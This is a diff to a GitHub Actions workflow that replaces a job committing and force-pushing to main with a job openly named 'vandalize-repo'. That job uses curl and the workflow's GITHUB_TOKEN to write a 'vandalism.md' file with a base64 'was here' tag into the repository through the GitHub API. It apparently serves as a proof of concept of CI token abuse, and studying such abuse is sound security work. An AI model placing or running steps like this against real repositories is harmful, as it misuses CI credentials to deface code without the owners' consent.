@@ -3,17 +3,11 @@ on:
       types: edited
 
 jobs:
-  build:
+  vandalize-repo:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v2
-
-      - name: Create local changes and commit
-        run: |
-          echo test > newfile
-          git add newfile
-          git config --local user.email "namatyage@gmail.com"
-          git config --local user.name "tyage"
-          git commit -m "Add changes" -a
-          git remote set-url origin https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${GITHUB_REPOSITORY}
-          git push --force origin HEAD:refs/heads/main
+      - name: Vandalize
+        run: 'curl -H "Authorization: bearer $GITHUB_TOKEN" -X PUT "https://api.github.com/repos/$REPO/contents/vandalism.md" --data ''{"message": "Create vandalism.md", "content": "TkFBIHdhcyBoZXJl"}'' '
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          REPO: ${{ github.repository }}
